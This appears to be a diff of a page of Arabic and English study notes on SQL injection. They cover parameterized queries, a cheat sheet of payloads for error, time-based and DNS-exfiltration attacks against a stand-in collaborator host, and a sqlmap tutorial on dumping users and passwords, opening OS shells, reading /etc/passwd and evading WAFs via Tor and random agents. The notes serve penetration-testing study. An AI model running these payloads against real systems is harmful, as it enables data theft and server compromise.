+<pre><code>// البيانات تدخل كمتغيرات معزولة تماماً ولا يتم دمجها كنصوص
+SELECT * FROM tracking WHERE id = ?
+</code></pre>
+<p>في هذه الحالة، حتى لو قام المستخدم بإدخال <code>' AND 1=(SELECT 1 FROM pg_sleep(5))--</code>، فإن قاعدة البيانات ستتعامل مع هذا الإدخال الطويل كـ "نص مجرد" يبحث عن ID يشبه هذا النص، ولن تقوم بتنفيذ دالة <code>pg_sleep</code> أو تفسيرها كأمر برمي إطلاقاً.</p>
+<hr />
+<p>SQL injection cheat sheet</p>
+<p>This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.
+String concatenation</p>
+<p>You can concatenate together multiple strings to make a single string.
+Oracle  'foo'||'bar'
+Microsoft   'foo'+'bar'
+PostgreSQL  'foo'||'bar'
+MySQL   'foo' 'bar' [Note the space between the two strings]
+CONCAT('foo','bar')
+Substring</p>
+<p>You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.
+Oracle  SUBSTR('foobar', 4, 2)
+Microsoft   SUBSTRING('foobar', 4, 2)
+PostgreSQL  SUBSTRING('foobar', 4, 2)
+MySQL   SUBSTRING('foobar', 4, 2)
+Comments</p>
+<p>You can use comments to truncate a query and remove the portion of the original query that follows your input.
+Oracle  --comment
+Microsoft   --comment
+/<em>comment</em>/
+PostgreSQL  --comment
+/<em>comment</em>/
+MySQL   #comment
+-- comment [Note the space after the double dash]
+/<em>comment</em>/
+Database version</p>
+<p>You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
+Oracle  SELECT banner FROM v$version
+SELECT version FROM v$instance
+Microsoft   SELECT @@version
+PostgreSQL  SELECT version()
+MySQL   SELECT @@version
+Database contents</p>
+<p>You can list the tables that exist in the database, and the columns that those tables contain.
+Oracle  SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+Microsoft   SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+PostgreSQL  SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+MySQL   SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+Conditional errors</p>
+<p>You can test a single boolean condition and trigger a database error if the condition is true.
+Oracle  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+Microsoft   SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+PostgreSQL  1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
+MySQL   SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
+Extracting data via visible error messages</p>
+<p>You can potentially elicit error messages that leak sensitive data returned by your malicious query.
+Microsoft   SELECT 'foo' WHERE 1 = (SELECT 'secret')</p>
+<blockquote>
+<p>Conversion failed when converting the varchar value 'secret' to data type int.
+PostgreSQL  SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
+invalid input syntax for integer: "secret"
+MySQL   SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
+XPATH syntax error: '\secret'
+Batched (or stacked) queries</p>
+</blockquote>
+<p>You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
+Oracle  Does not support batched queries.
+Microsoft   QUERY-1-HERE; QUERY-2-HERE
+QUERY-1-HERE QUERY-2-HERE
+PostgreSQL  QUERY-1-HERE; QUERY-2-HERE
+MySQL   QUERY-1-HERE; QUERY-2-HERE
+Note</p>
+<p>With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.
+Time delays</p>
+<p>You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
+Oracle  dbms_pipe.receive_message(('a'),10)
+Microsoft   WAITFOR DELAY '0:0:10'
+PostgreSQL  SELECT pg_sleep(10)
+MySQL   SELECT SLEEP(10)
+Conditional time delays</p>
+<p>You can test a single boolean condition and trigger a time delay if the condition is true.
+Oracle  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+Microsoft   IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+PostgreSQL  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+MySQL   SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+DNS lookup</p>
+<p>You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
+Oracle  </p>
+<p>(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</p>
+<p>The following technique works on fully patched Oracle installations, but requires elevated privileges:
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+Microsoft   exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+PostgreSQL  copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+MySQL   </p>
+<p>The following techniques work on Windows only:
+LOAD_FILE('\\BURP-COLLABORATOR-SUBDOMAIN\a')
+SELECT ... INTO OUTFILE '\\BURP-COLLABORATOR-SUBDOMAIN\a'
+DNS lookup with data exfiltration</p>
+<p>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
+Oracle  SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual
+Microsoft   declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+PostgreSQL  create OR replace function f() returns void as $$
+declare c text;
+declare p text;
+begin
+SELECT into p (SELECT YOUR-QUERY-HERE);
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+execute c;
+END;
+$$ language plpgsql security definer;
+SELECT f();
+MySQL   The following technique works on Windows only:
+SELECT YOUR-QUERY-HERE INTO OUTFILE '\\BURP-COLLABORATOR-SUBDOMAIN\a'</p>
+<p>علشان تعرف ايه ال schemas الموجوده في ال database</p>
+<pre><code>SELECT schema_name  
+FROM information_schema.schemata;
+</code></pre>
+<p>علشان تعرف ايه ال tables الموجودة في ال schema</p>
+<pre><code>SELECT table_name 
+FROM information_schema.tables 
+WHERE table_schema='database_name';
+</code></pre>
+<p>ده علشان تعرف ال columns الموجودة في ال table</p>
+<pre><code>SELECT column_name 
+FROM information_schema.columns 
+WHERE table_name='users';
+</code></pre>
+<pre><code>SELECT Column_name FROM TABLE_name WHERE USER_NAME=''
+</code></pre>
+<hr />
+<h3 id="dual-oracle">جدول DUAL في Oracle</h3>
+<p><strong>جدول DUAL</strong> هو جدول خاص في Oracle يحتوي على صف واحد وعمود واحد فقط. يُستخدم هذا الجدول عندما نحتاج إلى تنفيذ استعلامات SQL دون الحاجة إلى جداول فعلية، كاختبار الدوال، إجراء العمليات الحسابية، أو إرجاع قيمة معينة.</p>
+<h3 id="dual"><strong>خصائص جدول DUAL:</strong></h3>
+<ul>
+<li>يحتوي على <strong>صف واحد فقط</strong>.</li>
+<li>العمود الوحيد يُسمى <code>DUMMY</code> وقيمته هي <code>'X'</code>.</li>
+<li>يُستخدم عندما لا تتطلب الاستعلامات بيانات من جداول فعلية ولكن تتطلب بنية SQL.</li>
+</ul>
+<h3 id="dual_1">أمثلة لاستخدام جدول DUAL:</h3>
+<h3 id="1_5"><strong>1. إجراء عملية حسابية بسيطة:</strong></h3>
+<pre><code class="language-sql">SELECT 1+1 FROM DUAL;
+</code></pre>
+<p>الناتج:</p>
+<pre><code class="language-sql">1+1
+2
+</code></pre>
+<h3 id="dual_2">لماذا يتم استخدام جدول DUAL؟</h3>
+<ul>
+<li>تحتاج إلى وجود جدول في جملة <code>FROM</code> عند تنفيذ استعلام <code>SELECT</code> في Oracle SQL. يوفر جدول DUAL جدولاً بسيطاً ومسبق الإعداد لهذه العمليات عندما لا يكون الاستعلام من الجداول الفعلية ضرورياً.
+SQL injection attack, listing the database contents on Oracle</li>
+</ul>
+<hr />
+<p>علشان تعرف <strong>عدد الأعمدة (columns)</strong> قبل ما تستخدم <code>UNION SELECT</code>، فيه طريقتين مشهورين في اختبار <strong>SQL Injection</strong>. 👨‍💻</p>
+<hr />
+<h1 id="1-order-by">1️⃣ الطريقة الأسهل – <code>ORDER BY</code></h1>
+<p>بتزود الرقم لحد ما يحصل error.</p>
+<p>مثال:</p>
+<p>' ORDER BY 1-- -</p>
+<p>' ORDER BY 2-- -</p>
+<p>' ORDER BY 3-- -</p>
+<p>' ORDER BY 4-- -</p>
+<p>لما توصل لرقم يطلع <strong>error</strong> يبقى عدد الأعمدة هو الرقم اللي قبله.</p>
+<hr />
+<h1 id="sqlmap">ما هي sqlmap أصلاً؟</h1>
+<p>sqlmap هي أداة <strong>Automated SQL Injection Tool</strong>.</p>
+<p>يعني بدل ما تكتب payloads يدوي مثل:</p>
+<p>' OR 1=1 --</p>
+<p>الأداة تقوم تلقائيًا بـ:</p>
+<ul>
+<li>
+<p>اكتشاف الثغرة</p>
+</li>
+<li>
+<p>تحديد نوع الـ DBMS</p>
+</li>
+<li>
+<p>استخراج الداتا</p>
+</li>
+<li>
+<p>استخراج كلمات المرور</p>
+</li>
+<li>
+<p>أحيانًا تنفيذ أوامر على السيرفر</p>
+</li>
+</ul>
+<p>يعني باختصار:<br />
+<strong>Automation لعملية SQL Injection بالكامل.</strong></p>
+<hr />
+<h1 id="2_4">2️⃣ أمر المساعدة</h1>
+<p>sqlmap -h</p>
+<p>هذا يعرض <strong>Basic Help</strong>.</p>
+<p>لو عاوز كل الخيارات:</p>
+<p>sqlmap -hh</p>
+<p>سيظهر <strong>Advanced Help</strong>.</p>
+<hr />
+<h1 id="3-sqlmap">3️⃣ أهم أقسام الخيارات في sqlmap</h1>
+<p>الـ help مقسم لعدة أقسام:</p>
+<p>1️⃣ Target<br />
+2️⃣ Request<br />
+3️⃣ Injection<br />
+4️⃣ Detection<br />
+5️⃣ Techniques<br />
+6️⃣ Enumeration<br />
+7️⃣ OS Access</p>
+<p>سنشرح كل قسم.</p>
+<hr />
+<h1 id="4-target">4️⃣ Target (تحديد الهدف)</h1>
+<p>هنا تحدد الموقع الذي تريد اختباره.</p>
+<h3 id="_12">الأمر الأساسي</h3>
+<p>sqlmap -u http://site.com/page.php?id=1</p>
+<p>🔹 <code>-u</code></p>
+<p>يعني:</p>
+<p>URL</p>
+<p>مثال:</p>
+<p>http://site.com/product.php?id=5</p>
+<p>sqlmap سيجرب حقن SQL داخل:</p>
+<p>id</p>
+<hr />
+<h3 id="google-dork">Google Dork</h3>
+<p>-g "inurl:php?id="</p>
+<p>هنا sqlmap يبحث في جوجل عن مواقع قد تحتوي ثغرة.</p>
+<p>لكن هذا نادر الاستخدام الآن بسبب حماية Google.</p>
+<hr />
+<h1 id="5-request">5️⃣ Request (كيفية إرسال الطلب)</h1>
+<p>هذا القسم مهم عندما الموقع يحتاج:</p>
+<ul>
+<li>
+<p>cookies</p>
+</li>
+<li>
+<p>login</p>
+</li>
+<li>
+<p>POST data</p>
+</li>
+<li>
+<p>proxy</p>
+</li>
+</ul>
+<hr />
+<h3 id="post-data">إرسال POST Data</h3>
+<p>--data="id=1"</p>
+<p>يعني الطلب سيكون:</p>
+<p>POST /page.php<br />
+id=1</p>
+<hr />
+<h3 id="cookie">إرسال Cookie</h3>
+<p>--cookie="PHPSESSID=abc123"</p>
+<p>مفيد عندما يكون الموقع يتطلب login session.</p>
+<hr />
+<h3 id="user-agent">تغيير User Agent</h3>
+<p>--random-agent</p>
+<p>sqlmap سيستخدم:</p>
+<p>User Agent عشوائي.</p>
+<p>هذا يساعد في:</p>
+<ul>
+<li>
+<p>bypass WAF</p>
+</li>
+<li>
+<p>عدم كشف الأداة بسهولة</p>
+</li>
+</ul>
+<hr />
+<h3 id="proxy">استخدام Proxy</h3>
+<p>--proxy=http://127.0.0.1:8080</p>
+<p>مفيد مع:</p>
+<ul>
+<li>
+<p>Burp Suite</p>
+</li>
+<li>
+<p>debugging</p>
+</li>
+</ul>
+<hr />
+<h3 id="tor">استخدام Tor</h3>
+<p>--tor</p>
+<p>يرسل الطلبات عبر:</p>
+<p>Tor</p>
+<p>لإخفاء IP.</p>
+<hr />
+<h1 id="6-injection-options">6️⃣ Injection Options</h1>
+<p>هذه تحدد <strong>أين يحدث الحقن</strong>.</p>
+<h3 id="parameter">تحديد Parameter</h3>
+<p>-p id</p>
+<p>يعني:</p>
+<p>اختبر parameter اسمه:</p>
+<p>id</p>
+<p>مثال:</p>
+<p>site.com/page.php?id=1&amp;cat=2</p>
+<p>لو كتبت:</p>
+<p>-p id</p>
+<p>سيختبر فقط id.</p>
+<hr />
+<h3 id="_13">تحديد نوع قاعدة البيانات</h3>
+<p>--dbms=mysql</p>
+<p>هذا يجعل sqlmap لا يجرب كل DBMS.</p>
+<p>مما يزيد السرعة.</p>
+<hr />
+<h1 id="7-detection-options">7️⃣ Detection Options</h1>
+<p>هذه تتحكم في <strong>قوة الاختبار</strong>.</p>
+<hr />
+<h3 id="level">Level</h3>
+<p>--level=1 → 5</p>
+<p>كلما زاد الرقم:</p>
+<p>sqlmap يجرب parameters أكثر.</p>
+<p>مثال:</p>
+<table>
+<thead>
+<tr>
+<th>Level</th>
+<th>ماذا يفعل</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>parameters عادية</td>
+</tr>
+<tr>
+<td>2</td>
+<td>cookies</td>
+</tr>
+<tr>
+<td>3</td>
+<td>user-agent</td>
+</tr>
+<tr>
+<td>4</td>
+<td>headers</td>
+</tr>
+<tr>
+<td>5</td>
+<td>كل شيء</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="risk">Risk</h3>
+<p>--risk=1 → 3</p>
+<p>كلما زاد:</p>
+<p>payloads تصبح أخطر.</p>
+<table>
+<thead>
+<tr>
+<th>Risk</th>
+<th>ماذا يحدث</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>payloads آمنة</td>
+</tr>
+<tr>
+<td>2</td>
+<td>payloads أقوى</td>
+</tr>
+<tr>
+<td>3</td>
+<td>payloads قد تسبب مشاكل في السيرفر</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="8-techniques">8️⃣ Techniques</h1>
+<p>--technique=BEUSTQ</p>
+<p>هذا يحدد نوع SQL Injection الذي سيجربه.</p>
+<p>المعاني:</p>
+<table>
+<thead>
+<tr>
+<th>حرف</th>
+<th>النوع</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>B</td>
+<td>Boolean-based</td>
+</tr>
+<tr>
+<td>E</td>
+<td>Error-based</td>
+</tr>
+<tr>
+<td>U</td>
+<td>Union-based</td>
+</tr>
+<tr>
+<td>S</td>
+<td>Stacked queries</td>
+</tr>
+<tr>
+<td>T</td>
+<td>Time-based</td>
+</tr>
+<tr>
+<td>Q</td>
+<td>Inline queries</td>
+</tr>
+</tbody>
+</table>
+<p>مثلاً:</p>
+<p>--technique=U</p>
+<p>يجرب فقط:</p>
+<p>UNION injection</p>
+<hr />
+<h1 id="9-enumeration">9️⃣ Enumeration (استخراج البيانات)</h1>
+<p>هذا أهم جزء.</p>
+<hr />
+<p>معرفة نزع ال DBMS :</p>
+<p>sqlmap -u http://site.com/page.php?id=1 --fingerprint</p>
+<p>النتيجة :</p>
+<p>[info] the back-end DBMS is MYSQL (version: 5.)</p>
+<hr />
+<h2 id="_14">استخراج قواعد البيانات</h2>
+<p>--dbs</p>
+<p>مثال:</p>
+<p>sqlmap -u http://site.com/page.php?id=1 --dbs</p>
+<p>النتيجة:</p>
+<p>databases:<br />
+information_schema<br />
+mysql<br />
+users<br />
+shop</p>
+<hr />
+<h1 id="_15">🔟 استخراج الجداول</h1>
+<p>--tables</p>
+<p>لكن يجب تحديد database.</p>
+<p>مثال:</p>
+<p>-D shop --tables</p>
+<hr />
+<h1 id="11">11️⃣ استخراج الأعمدة</h1>
+<p>--columns</p>
+<p>مثال:</p>
+<p>-D shop -T users --columns</p>
+<hr />
+<h1 id="12">12️⃣ استخراج البيانات</h1>
+<p>--dump</p>
+<p>مثال:</p>
+<p>-D shop -T users --dump</p>
+<p>سيظهر:</p>
+<p>username<br />
+password<br />
+email</p>
+<hr />
+<h1 id="13">13️⃣ استخراج كل شيء</h1>
+<p>--dump-all</p>
+<p>هذا:</p>
+<ul>
+<li>
+<p>كل databases</p>
+</li>
+<li>
+<p>كل tables</p>
+</li>
+<li>
+<p>كل data</p>
+</li>
+</ul>
+<p>⚠️ قد يستغرق وقت طويل.</p>
+<hr />
+<h1 id="14">14️⃣ استخراج كلمات المرور</h1>
+<p>--passwords</p>
+<p>يعرض:</p>
+<p>mysql users password hashes</p>
+<hr />
+<h1 id="15">15️⃣ معرفة المستخدم الحالي</h1>
+<p>--current-user</p>
+<p>مثال:</p>
+<p>root@localhost</p>
+<hr />
+<h1 id="16-database">16️⃣ معرفة database الحالية</h1>
+<p>--current-db</p>
+<hr />
+<h1 id="17">17️⃣ الوصول لنظام التشغيل</h1>
+<p>إذا كانت الثغرة قوية.</p>
+<hr />
+<h3 id="shell">فتح shell</h3>
+<p>--os-shell</p>
+<p>سيعطيك terminal.</p>
+<hr />
+<h3 id="_16">تنفيذ أمر</h3>
+<p>--os-cmd="whoami"</p>
+<hr />
+<h3 id="_17">استغلال كامل</h3>
+<p>--os-pwn</p>
+<p>قد يعطي:</p>
+<ul>
+<li>
+<p>meterpreter</p>
+</li>
+<li>
+<p>reverse shell</p>
+</li>
+</ul>
+<hr />
+<h1 id="18-get-post">18️⃣ الفرق بين GET و POST</h1>
+<h2 id="get-example">GET Example</h2>
+<p>site.com/page.php?id=1</p>
+<p>تشغل:</p>
+<p>sqlmap -u site.com/page.php?id=1 --dbs</p>
+<hr />
+<h2 id="post-example">POST Example</h2>
+<p>البيانات تكون في body.</p>
+<p>مثال:</p>
+<p>blood_group=B+</p>
+<p>يجب حفظ الطلب في ملف.</p>
+<p>مثلاً:</p>
+<p>req.txt</p>
+<hr />
+<h1 id="19-request-file">19️⃣ استخدام request file</h1>
+<p>الأمر:</p>
+<p>sqlmap -r req.txt -p blood_group --dbs</p>
+<p>المعنى:</p>
+<table>
+<thead>
+<tr>
+<th>الخيار</th>
+<th>المعنى</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-r</td>
+<td>اقرأ الطلب من الملف</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>parameter vulnerable</td>
+</tr>
+<tr>
+<td>--dbs</td>
+<td>استخراج قواعد البيانات</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="20">20️⃣ استخراج الجداول</h1>
+<p>sqlmap -r req.txt -p blood_group -D blood --tables</p>
+<hr />
+<h1 id="21">21️⃣ استخراج الأعمدة</h1>
+<p>sqlmap -r req.txt -D blood -T blood_db --columns</p>
+<hr />
+<h1 id="22">22️⃣ استخراج البيانات</h1>
+<p>sqlmap -r req.txt -D blood -T users --dump</p>
+<hr />
+<h1 id="23-workflow">23️⃣ مثال Workflow كامل</h1>
+<p>Pentester عادة يعمل:</p>
+<h3 id="1_6">1️⃣ اختبار الثغرة</h3>
+<p>sqlmap -u site.com/page.php?id=1</p>
+<hr />
+<h3 id="2-dbs">2️⃣ استخراج DBs</h3>
+<p>sqlmap -u site.com/page.php?id=1 --dbs</p>
+<hr />
+<h3 id="3-tables">3️⃣ استخراج tables</h3>
+<p>sqlmap -u site.com/page.php?id=1 -D shop --tables</p>
+<hr />
+<h3 id="4-columns">4️⃣ استخراج columns</h3>
+<p>sqlmap -u site.com/page.php?id=1 -D shop -T users --columns</p>
+<hr />
+<h3 id="5-data">5️⃣ استخراج data</h3>
+<p>sqlmap -u site.com/page.php?id=1 -D shop -T users --dump</p>
+<hr />
+<h1 id="pentester">⚡ نصائح Pentester حقيقية</h1>
+<p>غالباً نستخدم:</p>
+<p>sqlmap -u URL --batch --random-agent --level=3 --risk=2</p>
+<p>لأن:</p>
+<ul>
+<li>
+<p><code>--batch</code> يمنع الأسئلة</p>
+</li>
+<li>
+<p><code>--random-agent</code> bypass detection</p>
+</li>
+<li>
+<p><code>level=3</code> اختبار أعمق</p>
+</li>
+</ul>
+<hr />
+<h1 id="command">🔥 أهم Command يستخدمه المحترفين</h1>
+<p>sqlmap -u URL --dbs --batch --random-agent --level=5 --risk=3</p>
+<hr />
+<h1 id="_18">نصيحة احترافية</h1>
+<p>لو أردت أن تحاول OS shell بطريقة أخرى:</p>
+<p>جرب:</p>
+<p>sqlmap -r req.txt --os-shell --technique=U</p>
+<p>أو:</p>
+<p>sqlmap -r req.txt --file-read=/etc/passwd</p>
+<p>لأن أحيانًا <strong>قراءة الملفات تنجح حتى لو الكتابة فشلت</strong>.</p>
+<hr />
+<p>to enter data in test :</p>
+<p>sqlmap -u "http://site.com/login.php " --data="username=mostafa&amp; password=123"</p>
+<hr />
+<h3 id="sqlmap-master-cheat-sheet">🛡️ SQLmap Master Cheat Sheet</h3>
+<h4 id="1-targeting-basics">1. الأوامر الأساسية وتحديد الهدف (Targeting &amp; Basics)</h4>
+<table>
+<thead>
+<tr>
+<th><strong>الأمر / الخيار</strong></th>
+<th><strong>الوصف</strong></th>
+<th><strong>مثال للاستخدام</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>-u</code></strong> أو <strong><code>--url</code></strong></td>
+<td>تحديد رابط الهدف (URL) للفحص.</td>
+<td><code>sqlmap -u "http://target.com/page.php?id=1"</code></td>
+</tr>
+<tr>
+<td><strong><code>--data</code></strong></td>
+<td>تحديد البيانات المرسلة في طلبات POST.</td>
+<td><code>sqlmap -u "http://target.com/login.php" --data="user=a&amp;pass=1"</code></td>
+</tr>
+<tr>
+<td><strong><code>-p</code></strong></td>
+<td>تحديد مُعامل (Parameter) معين للتركيز عليه في الحقن وتجاهل الباقي.</td>
+<td><code>sqlmap -u "http://target.com/page.php?id=1" -p id</code></td>
+</tr>
+<tr>
+<td><strong><code>--cookie</code></strong></td>
+<td>تمرير ملفات تعريف الارتباط (Cookies) لاختبار الصفحات التي تتطلب تسجيل دخول.</td>
+<td><code>sqlmap -u "URL" --cookie="PHPSESSID=xyz"</code></td>
+</tr>
+<tr>
+<td><strong><code>-r</code></strong></td>
+<td>استخدام ملف نصي يحتوي على طلب HTTP كامل تم اعتراضه (عبر Burp Suite مثلاً).</td>
+<td><code>sqlmap -r request.txt -p id</code></td>
+</tr>
+</tbody>
+</table>
+<h4 id="2-detection-techniques">2. الفحص والتحكم في التقنيات (Detection &amp; Techniques)</h4>
+<table>
+<thead>
+<tr>
+<th><strong>الأمر / الخيار</strong></th>
+<th><strong>الوصف</strong></th>
+<th><strong>مثال للاستخدام</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>--fingerprint</code></strong></td>
+<td>تحديد نوع وإصدار نظام إدارة قواعد البيانات (DBMS) بدقة.</td>
+<td><code>sqlmap -u "URL" --fingerprint</code></td>
+</tr>
+<tr>
+<td><strong><code>--technique</code></strong></td>
+<td>تحديد تقنية الحقن المراد استخدامها (B, E, U, S, T, Q).</td>
+<td><code>sqlmap -u "URL" --technique=B</code></td>
+</tr>
+<tr>
+<td><strong><code>--level</code></strong></td>
+<td>تحديد عمق الفحص (من 1 إلى 5). المستوى 1 للـ GET/POST. المستوى 2 يشمل الـ HTTP headers مثل الـ Cookie. المستوى 3 يشمل الـ Custom headers.</td>
+<td><code>sqlmap -u "URL" --level=3</code></td>
+</tr>
+<tr>
+<td><strong><code>--risk</code></strong></td>
+<td>تحديد مدى خطورة الـ Payloads على السيرفر (من 1 إلى 3). 1 آمن ، 2 متوسط ، 3 عالي الخطورة مثل الـ Stacked queries.</td>
+<td><code>sqlmap -u "URL" --risk=2</code></td>
+</tr>
+</tbody>
+</table>
+<h4 id="3-enumeration-data-extraction">3. استخراج البيانات (Enumeration &amp; Data Extraction)</h4>
+<table>
+<thead>
+<tr>
+<th><strong>الأمر / الخيار</strong></th>
+<th><strong>الوصف</strong></th>
+<th><strong>مثال للاستخدام</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>-b</code></strong> أو <strong><code>--banner</code></strong></td>
+<td>جلب بيانات وإصدار قاعدة البيانات (Banner) كإثبات للاختراق.</td>
+<td><code>sqlmap -u "URL" -b</code></td>
+</tr>
+<tr>
+<td><strong><code>--is-dba</code></strong></td>
+<td>التحقق مما إذا كان المستخدم الحالي لقاعدة البيانات يمتلك صلاحيات الإدارة (Admin/Root).</td>
+<td><code>sqlmap -u "URL" --is-dba</code></td>
+</tr>
+<tr>
+<td><strong><code>--users</code></strong></td>
+<td>استخراج قائمة بأسماء مستخدمي قاعدة البيانات.</td>
+<td><code>sqlmap -u "URL" --users</code></td>
+</tr>
+<tr>
+<td><strong><code>--dbs</code></strong></td>
+<td>استخراج واستعراض جميع قواعد البيانات المتاحة على السيرفر.</td>
+<td><code>sqlmap -u "URL" --dbs</code></td>
+</tr>
+<tr>
+<td><strong><code>-D</code></strong></td>
+<td>تحديد اسم قاعدة بيانات معينة للعمل عليها واستخراج بياناتها.</td>
+<td><code>sqlmap -u "URL" -D target_db --tables</code></td>
+</tr>
+<tr>
+<td><strong><code>--tables</code></strong> أو <strong><code>-T</code></strong></td>
+<td>استعراض الجداول الموجودة داخل قاعدة بيانات تم تحديدها مسبقاً.</td>
+<td><code>sqlmap -u "URL" -D target_db -T users --columns</code></td>
+</tr>
+<tr>
+<td><strong><code>--columns</code></strong> أو <strong><code>-C</code></strong></td>
+<td>استعراض الأعمدة الموجودة داخل جدول معين.</td>
+<td><code>sqlmap -u "URL" -D target_db -T users -C username,password --dump</code></td>
+</tr>
+<tr>
+<td><strong><code>--dump</code></strong></td>
+<td>استخراج (تفريغ) محتويات البيانات من جدول معين.</td>
+<td><code>sqlmap -u "URL" -D target_db -T users --dump</code></td>
+</tr>
+<tr>
+<td><strong><code>--dump-all</code></strong></td>
+<td>استخراج كل محتويات قاعدة البيانات بالكامل (عملية بطيئة ومكثفة جداً للموارد).</td>
+<td><code>sqlmap -u "URL" --dump-all</code></td>
+</tr>
+<tr>
+<td><strong><code>-a</code></strong> أو <strong><code>--all</code></strong></td>
+<td>جلب كل المعلومات المتاحة (Banner, Users, DBs, Tables...).</td>
+<td><code>sqlmap -u "URL" -a</code></td>
+</tr>
+</tbody>
+</table>
+<h4 id="4-advanced-evasion">4. الخيارات المتقدمة (Advanced &amp; Evasion)</h4>
+<table>
+<thead>
+<tr>
+<th><strong>الأمر / الخيار</strong></th>
+<th><strong>الوصف</strong></th>
+<th><strong>مثال للاستخدام</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>--tamper</code></strong></td>
+<td>استخدام سكربتات تعديل (Tamper Scripts) لتخطي الجدران النارية وأنظمة الحماية (WAF/Filters).</td>
+<td><code>sqlmap -u "URL" --tamper=space2comment</code></td>
+</tr>
+<tr>
+<td><strong><code>--os-shell</code></strong></td>
+<td>محاولة فتح Shell تفاعلي على نظام التشغيل الخاص بالسيرفر لتنفيذ أوامر النظام.</td>
+<td><code>sqlmap -u "URL" --os-shell</code></td>
+</tr>
+<tr>
+<td><strong><code>--file-read</code></strong></td>
+<td>قراءة ملفات من على السيرفر المستهدف.</td>
+<td><code>sqlmap -u "URL" --file-read="/etc/passwd"</code></td>
+</tr>
+<tr>
+<td><strong><code>--batch</code></strong></td>
+<td>تشغيل الأداة في الوضع التلقائي بالكامل واختيار الإجابات الافتراضية للأسئلة بدون تدخل منك.</td>
+<td><code>sqlmap -u "URL" --batch</code></td>
+</tr>
+</tbody>
+</table>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
